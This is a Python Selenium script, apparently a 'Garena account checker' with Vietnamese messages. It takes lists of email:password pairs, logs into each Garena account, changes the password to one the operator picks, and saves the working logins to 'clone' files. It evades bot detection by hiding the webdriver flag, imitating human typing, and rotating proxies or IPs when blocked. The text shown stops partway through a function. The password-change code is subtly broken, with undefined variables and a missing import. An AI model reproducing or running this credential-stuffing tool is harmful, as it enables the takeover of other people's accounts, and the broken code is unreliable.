import time
import csv
import random
import json
import os
import threading
import socket
import unicodedata
import warnings
from getpass import getpass, GetPassWarning
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium.webdriver.common.keys import Keys
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options
from colorama import init, Fore, Style

# Khởi tạo colorama
init(autoreset=True)

class GarenaAccountChecker:
    def __init__(self, new_password):
        if not new_password:
            raise ValueError("Mật khẩu mới không được để trống.")
        self.results = []
        self.checked = 0
        self.valid = 0
        self.invalid = 0
        self.clonelive_added = 0
        self.total_accounts = 0
        self.clonelive_total_current = 0
        self.change_results_file = "changepass.txt"
        self.new_password = new_password
        self.proxies = self.load_proxies()
        self.proxy_index = -1
        self.current_proxy = None
        if self.proxies:
            self.log_progress(
                f"Phat hien {len(self.proxies)} proxy. Se luan chuyen neu gap 3 INVALID lien tiep.",
                Fore.CYAN
            )

        self._chromedriver_binary_path = None
        self._chromedriver_reuse_logged = False

    def ensure_output_file(self, output_file):
        directory = os.path.dirname(output_file)
        if directory and not os.path.exists(directory):
            os.makedirs(directory, exist_ok=True)
        if not os.path.exists(output_file):
            with open(output_file, "w", encoding="utf-8") as f:
                f.write("Email  ||  Mật khóa  ||  Trạng thái    ||  Thông báo\n")
            self.log_progress(f"T\u1ea1o m\u1edbi file k\u1ebft qu\u1ea3: {output_file}", Fore.GREEN)


    def log_progress(self, message, color=Fore.MAGENTA):
        """In ra thông tin tiến trình kèm timestamp để dễ theo dõi."""
        timestamp = time.strftime("%H:%M:%S")
        print(f"{color}[{timestamp}] {message}{Style.RESET_ALL}")

    def alert_user(self, stop_event):
        """Phát âm thanh cảnh báo liên tục cho đến khi được yêu cầu dừng."""
        try:
            import winsound
            pattern = [(800, 250), (1000, 250), (1200, 250), (1000, 250)]
            while not stop_event.is_set():
                for freq, duration in pattern:
                    if stop_event.is_set():
                        break
                    winsound.Beep(freq, duration)
                    if stop_event.is_set():
                        break
                    time.sleep(0.05)
        except Exception:
            while not stop_event.is_set():
                print('\a', end='', flush=True)
                time.sleep(0.2)

    def get_current_ip(self):
        """Return current outward-facing IP if detectable."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.connect(("8.8.8.8", 80))
                return sock.getsockname()[0]
        except Exception:
            try:
                return socket.gethostbyname(socket.gethostname())
            except Exception:
                return None

    def wait_for_ip_change(self, original_ip, check_interval=0.5):
        """Pause execution until the network IP changes."""
        baseline = original_ip
        if baseline:
            self.log_progress(
                f"Tam dung cho den khi IP thay doi (hien tai: {baseline}).",
                Fore.YELLOW
            )
        else:
            self.log_progress(
                "Chua xac dinh duoc IP hien tai. Dang thu lai...",
                Fore.YELLOW
            )

        while True:
            current_ip = self.get_current_ip()
            if baseline:
                if current_ip and current_ip != baseline:
                    self.log_progress(
                        f"Phat hien IP moi: {current_ip}.",
                        Fore.GREEN
                    )
                    return current_ip
            else:
                if current_ip:
                    baseline = current_ip
                    self.log_progress(
                        f"Da xac dinh IP hien tai: {baseline}. Cho doi IP moi...",
                        Fore.YELLOW
                    )
            time.sleep(check_interval)


    def load_proxies(self, file_name="proxies.txt"):
        """Load proxy definitions from a local file or environment variable."""
        proxies = []
        entries = []

        env_value = os.environ.get("GARENA_PROXIES") or os.environ.get("PROXY_LIST")
        if env_value:
            entries.extend([item.strip() for item in env_value.split(',') if item.strip()])

        file_path = os.path.abspath(file_name)
        if os.path.exists(file_path):
            try:
                with open(file_path, 'r', encoding='utf-8') as proxy_file:
                    for raw_line in proxy_file:
                        line = raw_line.strip()
                        if not line or line.startswith('#'):
                            continue
                        entries.append(line)
            except Exception as proxy_error:
                self.log_progress(
                    f"Khong doc duoc danh sach proxy ({proxy_error}).",
                    Fore.YELLOW
                )

        for entry in entries:
            parsed = self.parse_proxy_entry(entry)
            if parsed:
                proxies.append(parsed)
            else:
                self.log_progress(f"Bo qua proxy khong hop le: {entry}", Fore.YELLOW)

        return proxies

    def parse_proxy_entry(self, raw_value):
        """Return a structured proxy configuration dict or None."""
        if not raw_value:
            return None

        cleaned = raw_value.strip()
        if not cleaned:
            return None

        if '://' in cleaned:
            scheme, remainder = cleaned.split('://', 1)
        else:
            scheme, remainder = 'http', cleaned

        parts = remainder.split(':')
        if len(parts) == 2:
            host, port = parts
            username = password = None
        elif len(parts) == 4:
            host, port, username, password = parts
        else:
            return None

        host = host.strip()
        port = port.strip()
        if not host or not port.isdigit():
            return None

        parsed = {
            'scheme': (scheme.strip() or 'http').lower(),
            'host': host,
            'port': port,
            'username': username.strip() if username else None,
            'password': password.strip() if password else None
        }

        parsed['label'] = f"{parsed['host']}:{parsed['port']}"
        parsed['argument'] = self.build_proxy_argument(parsed)
        parsed['requires_auth'] = bool(parsed['username'] and parsed['password'])
        return parsed

    def build_proxy_argument(self, proxy_entry):
        """Build the chrome proxy argument for the given proxy entry."""
        if not proxy_entry:
            return None

        scheme = proxy_entry.get('scheme') or 'http'
        host = proxy_entry.get('host')
        port = proxy_entry.get('port')
        username = proxy_entry.get('username')
        password = proxy_entry.get('password')

        if not host or not port:
            return None

        if username and password:
            return f"{scheme}://{username}:{password}@{host}:{port}"
        return f"{scheme}://{host}:{port}"

    def rotate_proxy(self):
        """Advance to the next proxy entry and return it."""
        if not self.proxies:
            return None

        self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
        self.current_proxy = self.proxies[self.proxy_index]
        label = self.current_proxy.get('label', 'proxy')
        total = len(self.proxies)
        self.log_progress(
            f"Chuyen sang proxy moi ({self.proxy_index + 1}/{total}): {label}",
            Fore.CYAN
        )
        return self.current_proxy

    def _resolve_chrome_binary(self):
        """Tra ve duong dan Chrome neu tim duoc, nguoc lai tra None de dung mac dinh."""
        env_candidates = [
            os.environ.get("CHROME_BINARY"),
            os.environ.get("GOOGLE_CHROME_BIN"),
        ]
        for candidate in env_candidates:
            if candidate and os.path.isfile(candidate):
                return os.path.abspath(candidate)

        candidate_paths = [
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        ]
        derived_candidates = [
            os.path.join(os.environ.get("PROGRAMFILES", ""), "Google", "Chrome", "Application", "chrome.exe"),
            os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Google", "Chrome", "Application", "chrome.exe"),
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "Application", "chrome.exe"),
        ]
        for candidate in derived_candidates:
            if candidate and candidate not in candidate_paths:
                candidate_paths.append(candidate)

        for candidate in candidate_paths:
            if candidate and os.path.isfile(candidate):
                return os.path.abspath(candidate)
        return None

    def _resolve_chromedriver_binary(self):
        """Tra ve duong dan ChromeDriver va cache ket qua cho lan sau."""
        cached_path = self._chromedriver_binary_path
        if cached_path and os.path.exists(cached_path):
            if not self._chromedriver_reuse_logged:
                self.log_progress(
                    f"Su dung lai ChromeDriver tai: {cached_path}",
                    Fore.CYAN
                )
                self._chromedriver_reuse_logged = True
            return cached_path

        try:
            path_str = ChromeDriverManager().install()
            self._chromedriver_binary_path = path_str
            self._chromedriver_reuse_logged = False
            self.log_progress(
                f"Da cai ChromeDriver tai: {path_str}",
                Fore.CYAN
            )
            return path_str
        except Exception as error:
            self.log_progress(
                f"Khong the cai ChromeDriver tu dong: {error}",
                Fore.RED
            )
            raise

    def normalize_text(self, text):
        """Return lowercase text with diacritics removed for keyword matching."""
        if not text:
            return ""
        normalized = unicodedata.normalize("NFD", text)
        stripped = "".join(ch for ch in normalized if unicodedata.category(ch) != "Mn")
        return stripped.lower()

    def setup_driver(self):
        """Cấu hình và khởi tạo trình duyệt Chrome thật trên máy"""
        self.log_progress("Đang cấu hình và khởi tạo trình duyệt Chrome...", Fore.YELLOW)
        options = Options()
        options.add_argument("--incognito")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--disable-gpu")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        options.add_experimental_option("detach", True)

        chrome_binary = self._resolve_chrome_binary()
        if chrome_binary:
            options.binary_location = chrome_binary
            self.log_progress(
                f"Su dung Chrome tai: {chrome_binary}",
                Fore.CYAN
            )
        else:
            self.log_progress(
                "Su dung Chrome mac dinh da cai tren may.",
                Fore.CYAN
            )

        proxy_argument = self.build_proxy_argument(self.current_proxy)
        if proxy_argument:
            options.add_argument(f"--proxy-server={proxy_argument}")
            options.add_argument("--ignore-certificate-errors")
            options.add_argument("--proxy-bypass-list=<-loopback>")
            label = self.current_proxy.get('label', proxy_argument)
            scheme = self.current_proxy.get('scheme', 'http')
            auth_note = ' co xac thuc' if self.current_proxy.get('requires_auth') else ''
            self.log_progress(
                f"Su dung proxy {label} ({scheme}{auth_note}).",
                Fore.CYAN
            )

        try:
            driver = webdriver.Chrome(
                service=Service(self._resolve_chromedriver_binary()),
                options=options
            )
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            self.log_progress("Khởi tạo trình duyệt thành công.", Fore.GREEN)
            return driver
        except Exception as e:
            self.log_progress(f"Lỗi khi khởi tạo trình duyệt: {e}", Fore.RED)
            return None

    def type_like_human(self, element, text):
        """Gõ phím giống người thật"""
        for char in text:
            element.send_keys(char)
            time.sleep(random.uniform(0.05, 0.15))

    def remove_account_from_source(self, email, password, file_path="accounts.txt"):
        """Xoa tai khoan khoi file nguon sau khi da xu ly."""
        try:
            if not file_path or not os.path.exists(file_path):
                return
            with open(file_path, "r", encoding="utf-8") as f:
                lines = f.readlines()
            removed = False
            remaining = []
            for line in lines:
                stripped = line.strip()
                if not stripped:
                    remaining.append(line)
                    continue
                normalized = stripped
                if ":" not in normalized and "|" in normalized:
                    normalized = normalized.replace("|", ":", 1)
                if ":" in normalized:
                    left, right = [part.strip() for part in normalized.split(":", 1)]
                    if left == email and right == password and not removed:
                        removed = True
                        continue
                remaining.append(line)
            if removed:
                with open(file_path, "w", encoding="utf-8") as f:
                    f.writelines(remaining)
                self.log_progress(f"Da xoa {email} khoi {file_path}.", Fore.CYAN)
        except Exception as e:
            self.log_progress(f"Khong the xoa {email} khoi {file_path}: {e}", Fore.YELLOW)


    def record_password_change(self, email, old_password, new_password, status, message):
        """Ghi lại kết quả đổi mật khẩu vào changepass.txt"""
        sanitized = (message or "").replace('\r', ' ').replace('\n', ' ').strip()
        try:
            with open(self.change_results_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}  ||  {old_password}  ->  {new_password}  ||  {status}  ||  {sanitized}\n")
        except Exception as write_error:
            self.log_progress(f"Không ghi được {self.change_results_file}: {write_error}", Fore.YELLOW)


    def reset_output_files(self, output_file, valid_file, invalid_file, notcheck_file):
        """Dat lai cac file ket qua truoc khi bat dau mot lan kiem tra moi."""
        self.log_progress("Dang reset cac file ket qua cu.", Fore.YELLOW)
        file_defaults = {
            output_file: "Email  ||  Mật khẩu  ||  Trạng thái    ||  Thông báo\n",
            valid_file: "",
            "clonepass.txt": "",
            invalid_file: "",
            notcheck_file: "",
            "liveordie.txt": "",
            "clonelive.js": "[]\n",
            "clonelive.txt": "",
            "clonedie.js": "[]\n",
            "clonedie.txt": ""
        }
        processed = set()
        for path_value, content in file_defaults.items():
            if not path_value or path_value in processed:
                continue
            processed.add(path_value)
            try:
                with open(path_value, "w", encoding="utf-8") as f:
                    f.write(content)
            except Exception as reset_error:
                self.log_progress(f"Khong the reset {path_value}: {reset_error}", Fore.YELLOW)
        self.results.clear()
        self.checked = 0
        self.valid = 0
        self.invalid = 0
        self.clonelive_added = 0
        self.clonelive_total_current = 0
        self.total_accounts = 0


    def check_account(self, email, password):
        """Kiểm tra một tài khoản Garena"""
        self.log_progress(f"Bắt đầu kiểm tra tài khoản: {email}", Fore.CYAN)
        driver = self.setup_driver()
        if not driver:
            return False, "Không thể khởi tạo trình duyệt"

        try:
            login_url = "https://account.garena.com/"
            self.log_progress("Đang mở trang đăng nhập...", Fore.CYAN)
            start_time = time.time()
            driver.get(login_url)
            time.sleep(1.5)
            load_time = time.time() - start_time
            self.log_progress(f"Đã mở trang đăng nhập trong {load_time:.2f} giây.", Fore.CYAN)

            try:
                self.log_progress("Đang chờ form đăng nhập xuất hiện...", Fore.CYAN)
                WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.TAG_NAME, "input"))
                )
                self.log_progress("Đã phát hiện form đăng nhập.", Fore.GREEN)
            except Exception:
                current_url = driver.current_url.lower()
                if "blog" in current_url:
                    self.log_progress("Trang đăng nhập chuyển sang blog - có thể bị chặn.", Fore.RED)
                    return False, "Tài khoản bị chặn (blog)"
                if "access" in current_url:
                    self.log_progress("Trang thông báo access - có thể bị chặn IP.", Fore.RED)
                    return False, "IP bị chặn tạm thời"
                if "block" in current_url:
                    self.log_progress("Trang thông báo block - có thể bị chặn IP.", Fore.RED)
                    return False, "IP bị chặn, vui lòng thử lại sau"
                self.log_progress("Không tìm thấy form đăng nhập.", Fore.RED)
                return False, "Không tìm thấy form đăng nhập"

            self.log_progress("Đang chuẩn bị nhập thông tin đăng nhập...", Fore.CYAN)
            inputs = driver.find_elements(By.TAG_NAME, "input")
            if len(inputs) < 2:
                self.log_progress("Không tìm thấy đủ trường nhập liệu.", Fore.RED)
                return False, "Không tìm thấy đủ trường nhập liệu"

            email_field = inputs[0]
            email_field.clear()
            self.log_progress("Đang nhập email...", Fore.CYAN)
            self.type_like_human(email_field, email)

            email_field.send_keys(Keys.TAB)
            time.sleep(0.5)

            password_field = driver.switch_to.active_element
            self.log_progress("Đang nhập mật khẩu...", Fore.CYAN)
            password_field.send_keys(password)

            before_login_url = driver.current_url

            self.log_progress("Đang gửi yêu cầu đăng nhập...", Fore.CYAN)
            password_field.send_keys(Keys.ENTER)

            self.log_progress("Đang chờ phản hồi đăng nhập...", Fore.CYAN)
            time.sleep(6)

            after_login_url = driver.current_url
            self.log_progress(f"URL sau đăng nhập: {after_login_url}", Fore.CYAN)

            current_url_lower = after_login_url.lower()
            if "blog" in current_url_lower:
                self.log_progress("Bị chuyển hướng sang blog - tài khoản bị chặn.", Fore.RED)
                return False, "Tài khoản bị chặn (blog)"
            if "access" in current_url_lower:
                self.log_progress("Bị chặn tạm thời do IP.", Fore.RED)
                return False, "IP bị chặn tạm thời"
            if "block" in current_url_lower:
                self.log_progress("Bị chặn truy cập.", Fore.RED)
                return False, "IP bị chặn, vui lòng thử lại sau"
            if "error" in current_url_lower:
                self.log_progress("Trang báo lỗi đăng nhập.", Fore.RED)
                return False, "Lỗi đăng nhập"

            try:
                error_div = driver.find_element(
                    By.XPATH,
                    '//div[contains(@class, "error") or contains(@class, "error-message")]'
                )

                if error_div.is_displayed():
                    error_text = error_div.text.strip()
                    lower_error = error_text.lower()
                    if "sai tên tài khoản hoặc mật khẩu" in lower_error or "username or password is incorrect." in lower_error:
                        self.log_progress("Sai mật khẩu.", Fore.YELLOW)
                        return False, "SAI_PASS"
                    if "chưa xác định lỗi sai" in lower_error or "an unknown error occured." in lower_error:
                        self.log_progress("Lỗi mạng hoặc lỗi không xác định.", Fore.YELLOW)
                        return False, "NOT_INTERNET"
                    if "user has been banned" in lower_error or "tài khoản đã bị khóa" in lower_error:
                        self.log_progress("Tài khoản bị khóa.", Fore.RED)
                        return False, "Tài khoản bị khóa"
                    self.log_progress(f"Lỗi khác: {error_text}", Fore.YELLOW)
                    return False, f"Lỗi: {error_text}"
            except NoSuchElementException:
                self.log_progress("Không thấy thông báo lỗi hiển thị.", Fore.GREEN)
            except Exception as e:
                self.log_progress(f"Lỗi khi đọc thông báo lỗi: {e}", Fore.YELLOW)

            try:
                block_element = driver.find_element(By.XPATH, "//BODY/DIV[2]/DIV[1]")
                if block_element.is_displayed():
                    self.log_progress("Phat hien trang chan dang nhap.", Fore.RED)
                    self.remove_account_from_source(email, password)
                    return False, "CANT_LOGIN"
            except NoSuchElementException:
                pass
            except Exception as e:
                self.log_progress(f"Loi khi kiem tra chan dang nhap: {e}", Fore.YELLOW)

            if before_login_url != after_login_url:
                self.log_progress("Đăng nhập thành công, tiến hành đổi mật khẩu.", Fore.GREEN)
                time.sleep(3)
                try:
                    driver.find_element(By.XPATH, "/html/body/div[1]/div/div[1]/div[1]/aside/div/div[2]/a[1]").click()
                    time.sleep(0.5)
                    current_password_field = WebDriverWait(driver, 5).until(
                        EC.element_to_be_clickable((By.XPATH, '//*[@id="J-form-curpwd"]'))
                    )
                    current_password_field.click()
                    current_password_field.clear()
                    pyperclip.copy(password)
                    element.send_keys(Keys.CONTROL, 'v')
                    current_password_field.send_keys(Keys.TAB)
                    time.sleep(random.uniform(0.5, 1))

                    pyperclip.copy(new_password)
                    element.send_keys(Keys.CONTROL, 'v')
                    current_password_field.send_keys(Keys.TAB)
                    time.sleep(random.uniform(0.5, 1))

                    element.send_keys(Keys.CONTROL, 'v')
                    confirm_password_field.send_keys(Keys.ENTER)
                    self.log_progress("Đã gửi yêu cầu đổi mật khẩu, chờ phản hồi...", Fore.CYAN)
                    time.sleep(4)

                    message_candidates = [
                        "//div[contains(@class,'msg')]",
                        "//p[contains(@class,'msg')]",
                        "//span[contains(@class,'msg')]",
                        "//div[contains(@class,'tips')]",
                        "//div[contains(@class,'result')]"
                    ]
                    feedback_text = ""
                    for selector in message_candidates:
                        elements = driver.find_elements(By.XPATH, selector)
                        for element in elements:
                            text_value = element.text.strip()
                            if text_value:
                                feedback_text = text_value
                                break
                        if feedback_text:
                            break
                    if not feedback_text:
                        feedback_text = "Không tìm thấy thông báo sau khi đổi mật khẩu"

                    normalized_feedback = self.normalize_text(feedback_text)
                    success_keywords = [
                        "thanh cong",
                        "success",
                        "doi mat khau thanh cong",
                        "change password successfully",
                        "password changed"
                    ]
                    is_success = any(keyword in normalized_feedback for keyword in success_keywords)

                    status_label = "SUCCESS" if is_success else "FAILED"
                    self.record_password_change(email, password, self.new_password, status_label, feedback_text)

                    if is_success:
                        success_message = f"Đổi mật khẩu thành công: {feedback_text}"
                        self.log_progress(success_message, Fore.GREEN)
                        return True, success_message
                    else:
                        failure_message = f"CHANGE_FAILED: {feedback_text}"
                        self.log_progress(failure_message, Fore.YELLOW)
                        return False, failure_message

                except Exception as change_error:
                    error_message = str(change_error)
                    logged_message = f"CHANGE_ERROR: {error_message}"
                    self.log_progress(f"Lỗi khi đổi mật khẩu: {error_message}", Fore.RED)
                    self.record_password_change(email, password, self.new_password, "ERROR", error_message)
                    return False, logged_message

            self.log_progress("URL không đổi sau đăng nhập - đăng nhập thất bại.", Fore.RED)
            return False, "Bị block hoặc gặp captcha"

        except TimeoutException:
            self.log_progress("Quá thời gian chờ tải trang.", Fore.RED)
            return False, "Lỗi: Quá thời gian chờ tải trang"
        except Exception as e:
            self.log_progress(f"Lỗi trong quá trình kiểm tra: {e}", Fore.RED)
            return False, f"Lỗi: {str(e)}"
        finally:
            self.log_progress("Đóng trình duyệt.", Fore.YELLOW)
            driver.quit()

    def process_accounts(self, input_file, output_file):
        """Xử lý danh sách tài khoản và ghi trực tiếp vào các file sau mỗi lần kiểm tra"""
        self.log_progress("Chuẩn bị các file kết quả để ghi dữ liệu.", Fore.YELLOW)
        valid_file = "clonepass.js"
        invalid_file = "cloneunpass.txt"
        notcheck_file = "notcheck.txt"

        self.reset_output_files(output_file, valid_file, invalid_file, notcheck_file)
        self.ensure_output_file(output_file)

        try:
            with open(input_file, "r", encoding="utf-8") as f:
                accounts = []
                for raw_line in f:
                    line = raw_line.strip()
                    if not line:
                        continue
                    if ":" not in line and "|" in line:
                        line = line.replace("|", ":", 1)
                    if ":" not in line:
                        continue
                    parts = [part.strip() for part in line.split(":", 1)]
                    accounts.append(parts)

            total = len(accounts)
            self.total_accounts = total
            self.log_progress(f"Đã tìm thấy {total} tài khoản để kiểm tra từ {input_file}.", Fore.CYAN)
            print(f"{Fore.YELLOW}Đang bắt đầu kiểm tra...{Style.RESET_ALL}\n")

            pending_invalid_records = []
            invalid_streak = []

            def flush_pending_invalid():
                nonlocal pending_invalid_records, invalid_streak
                if not pending_invalid_records:
                    return
                self.log_progress(
                    f"Đang ghi {len(pending_invalid_records)} tài khoản INVALID đang chờ.",
                    Fore.MAGENTA
                )
                for record in pending_invalid_records:
                    email = record["email"]
                    password = record["password"]
                    message = record["message"]
                    with open(notcheck_file, "a", encoding="utf-8") as f:
                        f.write(f"{email}:{password}  ||  {message}\n")
                    with open(output_file, "a", encoding="utf-8") as f:
                        f.write(f"{email}  ||  {password}  ||  INVALID  ||  {message}\n")
                    self.invalid += 1
                    self.checked += 1
                    self.log_progress(
                        f"Đã cập nhật trạng thái INVALID cho {email}.",
                        Fore.MAGENTA
                    )
                pending_invalid_records = []
                invalid_streak = []

            i = 0
            while i < total:
                account = accounts[i]
                display_idx = i + 1

                if len(account) != 2:
                    flush_pending_invalid()
                    self.log_progress(
                        f"[{display_idx}/{total}] Bỏ qua dòng không hợp lệ: {':'.join(account)}",
                        Fore.YELLOW
                    )
                    with open(notcheck_file, "a", encoding="utf-8") as f:
                        f.write(f"{':'.join(account)}\n")
                    with open(output_file, "a", encoding="utf-8") as f:
                        f.write(f"{account[0]}  ||  {account[1]}  ||  INVALID  ||  Dữ liệu không hợp lệ\n")
                    self.invalid += 1
                    self.checked += 1
                    i += 1
                    continue

                email = account[0].strip()
                password = account[1].strip()
                self.log_progress(
                    f"[{display_idx}/{total}] Bắt đầu kiểm tra tài khoản {email}",
                    Fore.CYAN
                )

                try:
                    success, message = self.check_account(email, password)

                    if success:
                        flush_pending_invalid()
                        self.valid += 1
                        with open(valid_file, "a", encoding="utf-8") as f:
                            f.write(f'{{"username": "{email}", "password": "{password}" }},\n')
                        try:
                            with open("clonepass.txt", "a", encoding="utf-8") as txt_file:
                                txt_file.write(f"{email}:{password}\n")
                        except Exception as txt_error:
                            self.log_progress(f"Khong ghi duoc clonepass.txt: {txt_error}", Fore.YELLOW)
                        self.log_progress(
                            f"[{display_idx}/{total}] {email} hợp lệ - đã ghi vào {valid_file}.",
                            Fore.GREEN
                        )
                        with open(output_file, "a", encoding="utf-8") as f:
                            f.write(f"{email}  ||  {password}  ||  VALID  ||  {message}\n")
                        self.remove_account_from_source(email, password, input_file)
                        self.checked += 1
                        invalid_streak.clear()

                    else:
                        if message == "SAI_PASS":
                            flush_pending_invalid()
                            self.invalid += 1
                            with open(invalid_file, "a", encoding="utf-8") as f:
                                f.write(f"{email}:{password}\n")
                            self.log_progress(
                                f"[{display_idx}/{total}] {email} sai mật khẩu - đã ghi vào {invalid_file}.",
                                Fore.YELLOW
                            )
                            with open(output_file, "a", encoding="utf-8") as f:
                                f.write(f"{email}  ||  {password}  ||  UNPASS  ||  {message}\n")
                            self.remove_account_from_source(email, password, input_file)
                            self.checked += 1
                            invalid_streak.clear()

                        elif message == "NOT_INTERNET":
                            flush_pending_invalid()
                            self.invalid += 1
                            with open(notcheck_file, "a", encoding="utf-8") as f:
                                f.write(f"{email}:{password}  ||  {message}\n")
                            self.log_progress(
                                f"[{display_idx}/{total}] {email} gặp lỗi mạng - đã ghi vào {notcheck_file}.",
                                Fore.YELLOW
                            )
                            with open(output_file, "a", encoding="utf-8") as f:
                                f.write(f"{email}  ||  {password}  ||  NOT_INTERNET  ||  {message}\n")
                            self.checked += 1
                            invalid_streak.clear()
                        elif message == "NO_DATA":
                            flush_pending_invalid()
                            self.invalid += 1
                            with open(notcheck_file, "a", encoding="utf-8") as f:
                                f.write(f"{email}:{password}  ||  Không load được dữ liệu\n")
                            self.log_progress(
                                f"[{display_idx}/{total}] {email} Không load được dữ liệu - đã ghi vào {notcheck_file}.",
                                Fore.YELLOW
                            )
                            with open(output_file, "a", encoding="utf-8") as f:
                                f.write(f"{email}  ||  {password}  ||  INVALID  ||  Không load được dữ liệu\n")
                            self.checked += 1
                            invalid_streak.clear()


                        elif message == "CANT_LOGIN":
                            flush_pending_invalid()
                            self.invalid += 1
                            self.log_progress(
                                f"[{display_idx}/{total}] {email} bi chan dang nhap - da xoa khoi accounts.txt.",
                                Fore.RED
                            )
                            with open(output_file, "a", encoding="utf-8") as f:
                                f.write(f"{email}  ||  {password}  ||  CANT_LOGIN  ||  Chan dang nhap\n")
                            self.checked += 1
                            invalid_streak.clear()

                        else:
                            invalid_streak.append({"index": i, "email": email, "password": password})
                            pending_invalid_records.append({
                                "email": email,
                                "password": password,
                                "message": message
                            })
                            self.log_progress(
                                f"[{display_idx}/{total}] {email} trả về INVALID: {message}",
                                Fore.RED
                            )

                            if len(invalid_streak) >= 3:
                                first = invalid_streak[0]["index"]
                                second = invalid_streak[1]["index"]
                                third = invalid_streak[2]["index"]
                                if third == i and second == i - 1 and first == i - 2:
                                    self.log_progress(
                                        "Phat hien 3 tai khoan INVALID lien tiep. Dang khoi phuc ket noi.",
                                        Fore.RED
                                    )
                                    restarted_via_proxy = False
                                    proxy_entry = None
                                    if self.proxies:
                                        proxy_entry = self.rotate_proxy()
                                        if proxy_entry:
                                            restarted_via_proxy = True
                                            time.sleep(2)

                                    if not restarted_via_proxy:
                                        stop_event = threading.Event()
                                        alert_thread = threading.Thread(
                                            target=self.alert_user,
                                            args=(stop_event,),
                                            daemon=True
                                        )
                                        alert_thread.start()
                                        original_ip = self.get_current_ip()
                                        new_ip = self.wait_for_ip_change(original_ip, check_interval=0.5)
                                        stop_event.set()
                                        alert_thread.join()
                                        if new_ip:
                                            self.log_progress(
                                                f"Tiep tuc kiem tra sau khi IP thay doi thanh {new_ip}.",
                                                Fore.GREEN
                                            )
                                        else:
                                            self.log_progress(
                                                "Tiep tuc kiem tra du khong xac dinh duoc IP moi.",
                                                Fore.YELLOW
                                            )
                                    else:
                                        label = proxy_entry.get('label', 'proxy') if proxy_entry else 'proxy'
                                        self.log_progress(
                                            f"Tiep tuc kiem tra voi proxy moi: {label}.",
                                            Fore.GREEN
                                        )

                                    restart_index = first
                                    pending_invalid_records = []
                                    invalid_streak = []
                                    self.log_progress(
                                        f"Quay lai kiem tra tu tai khoan thu {restart_index + 1}.",
                                        Fore.YELLOW
                                    )
                                    i = restart_index
                                    continue

                    i += 1
                    delay = random.uniform(3, 7)
                    self.log_progress(f"Nghỉ {delay:.2f} giây trước khi kiểm tra tài khoản tiếp theo.", Fore.YELLOW)
                    self.log_progress("", Fore.YELLOW)
                    self.log_progress("", Fore.YELLOW)
                    self.log_progress("", Fore.YELLOW)
                    time.sleep(delay)

                except KeyboardInterrupt:
                    flush_pending_invalid()
                    self.log_progress("Người dùng dừng chương trình!", Fore.RED)
                    with open(notcheck_file, "a", encoding="utf-8") as f:
                        f.write(f"{email}:{password}\n")
                    with open(output_file, "a", encoding="utf-8") as f:
                        f.write(f"{email}  ||  {password}  ||  INVALID  ||  Người dùng dừng chương trình\n")
                    break

            flush_pending_invalid()

        except Exception as e:
            error_msg = f"Lỗi tổng: {str(e)}"
            self.log_progress(error_msg, Fore.RED)
            with open(notcheck_file, "a", encoding="utf-8") as f:
                f.write(f"{error_msg}\n")
            with open(output_file, "a", encoding="utf-8") as f:
                f.write(f"{error_msg}\n")

    def save_results(self, output_file):
        """Lưu kết quả ra file với định dạng: Email  ||  Mật khẩu  ||  Trạng thái    ||  Thông báo"""
        self.log_progress("Đang lưu kết quả tổng hợp.", Fore.YELLOW)
        try:
            with open(output_file, "w", encoding="utf-8") as f:
                f.write("Email  ||  Mật khẩu  ||  Trạng thái    ||  Thông báo\n")
                for row in self.results:
                    if row[2] == "VALID":
                        f.write(f"{row[0]}  ||  {row[1]}  ||  VALID    ||  {row[3]}\n")
                    else:
                        f.write(f"{row[0]}  ||  {row[1]}  ||  {row[2]}  ||  {row[3]}\n")

            self.log_progress(f"Đã lưu kết quả vào {output_file}.", Fore.GREEN)
            print(f"\n{Fore.GREEN}=== KẾT QUẢ KIỂM TRA ===")
            print(f"Tổng số tài khoản đã kiểm tra: {self.checked}")
            print(f"{Fore.GREEN}Tài khoản hợp lệ: {self.valid}")
            print(f"{Fore.RED}Tài khoản không hợp lệ: {self.invalid}")
            print(f"{Fore.YELLOW}Kết quả đã được lưu vào file: {output_file}{Style.RESET_ALL}")

        except Exception as e:
            self.log_progress(f"Lỗi khi lưu kết quả: {str(e)}", Fore.RED)
            print(f"\n{Fore.RED}Lỗi khi lưu kết quả: {str(e)}{Style.RESET_ALL}")

def prompt_new_password():
    """Yêu cầu người dùng nhập và xác nhận mật khẩu mới trước khi chạy chương trình"""

    def read_password(prompt_text):
        try:
            with warnings.catch_warnings(record=True) as warning_list:
                warnings.simplefilter('always', category=GetPassWarning)
                value = getpass(prompt_text)
                if any(issubclass(warning.category, GetPassWarning) for warning in warning_list):
                    raise GetPassWarning()
                return value
        except (GetPassWarning, EOFError):
            print(f"{Fore.YELLOW}Không thể ẩn ký tự khi nhập, mật khẩu sẽ hiển thị công khai.{Style.RESET_ALL}")
            return input(f"{prompt_text} (hiển thị): ")

    while True:
        print(f"{Fore.CYAN}Lưu ý: mật khẩu sẽ không hiển thị khi nhập.{Style.RESET_ALL}")
        new_password = read_password('Nhập mật khẩu mới muốn đổi: ').strip()
        if not new_password:
            print(f"{Fore.RED}Mật khẩu không được để trống. Vui lòng thử lại.{Style.RESET_ALL}")
            continue
        confirm_password = read_password('Nhập lại mật khẩu mới để xác nhận: ').strip()
        if new_password != confirm_password:
            print(f"{Fore.RED}Hai lần nhập mật khẩu không trùng khớp. Vui lòng thử lại.{Style.RESET_ALL}")
            continue
        confirmation = input('Xác nhận sử dụng mật khẩu này? (Y/n): ').strip().lower()
